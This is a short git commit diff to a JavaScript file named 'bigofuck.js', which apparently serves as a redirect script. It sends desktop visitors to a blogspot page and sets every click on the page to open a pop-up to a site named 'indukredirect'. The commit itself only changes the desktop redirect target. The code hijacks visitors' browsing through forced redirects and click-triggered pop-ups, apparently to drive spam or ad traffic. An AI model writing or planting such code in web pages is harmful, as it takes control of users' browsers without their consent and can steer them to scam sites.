273665acd8e32d4f87d3b704906016b16b16c9b6
irawanria85 <irawanria85@gmail.com>
2020-08-23 20:35:00 +0700

    Update bigofuck.js

--- bigofuck.js
+++ bigofuck.js
@@ -1,7 +1,7 @@
 //laptop
 if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i)) || (navigator.userAgent.indexOf('Android') != -1)){
 }
-else location.replace("https://yurisehat.blogspot.com/p/lanjut.html");
+else location.replace("//autoambyar.blogspot.com/");
 // click
 document.onclick = function() {
 window.open('//indukredirect.blogspot.com/', '_blank')
